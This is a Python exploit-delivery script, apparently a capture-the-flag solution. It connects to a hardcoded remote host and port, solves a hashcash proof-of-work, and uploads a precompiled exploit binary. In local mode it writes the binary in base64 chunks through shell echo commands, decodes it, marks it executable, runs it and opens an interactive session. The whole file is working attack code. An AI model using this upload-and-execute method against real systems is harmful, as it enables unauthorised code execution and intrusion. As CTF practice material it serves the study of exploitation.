#!/usr/bin/env python3
from sc_expwn import *  # https://raw.githubusercontent.com/shift-crops/sc_expwn/master/sc_expwn.py
import os

bin_file = './run.sh'
context(os = 'linux', arch = 'amd64')
# context.log_level = 'debug'

#==========

env = Environment('local', 'remote')
env.set_item('mode',    local = 'PROC', remote = 'SOCKET')
env.set_item('target',  local   = {'argv':[bin_file]}, \
                        remote  = {'host':'13.231.7.116', 'port':9427})
env.select()

#==========

def attack(conn, **kwargs):
    exploit = open('bug', 'rb').read()

    if env.check('remote'):
        conn.recvuntil('hashcash ')
        opt = conn.recvline(keepends=False)

        p = process('hashcash {}'.format(opt.decode()).split())
        p.wait_for_close()
        token = p.recv().split()[-1].decode()
        info('token : {}'.format(token))
        conn.sendline(token)
        
        conn.sendlineafter('bytes?', str(len(exploit))) 
        conn.sendafter('bytes..', exploit) 
        conn.sendlineafter('$', '/home/atoms/exp') 
    else:
        exploit = base64.b64encode(exploit).decode()

        conn.sendlineafter('$', '') 
        with log.progress('Sending exploit...') as p:
            sent_size = 0
            for s in [exploit[i: i+0x80] for i in range(0, len(exploit), 0x80)]:
                sent_size += len(s)
                conn.sendlineafter('$', 'echo {} >> exploit.b64'.format(s)) 
                p.status('{} bytes'.format(sent_size))

        conn.sendlineafter('$', 'base64 -d exploit.b64 > exploit'.format(exploit)) 
        conn.sendlineafter('$', 'chmod +x exploit') 

        conn.sendlineafter('$', './exploit') 

#==========

def main():
    comn = Communicate(env.mode, **env.target)
    comn.connect()
    comn.run(attack)
    comn.interactive()

if __name__=='__main__':
    main()
    
#==========
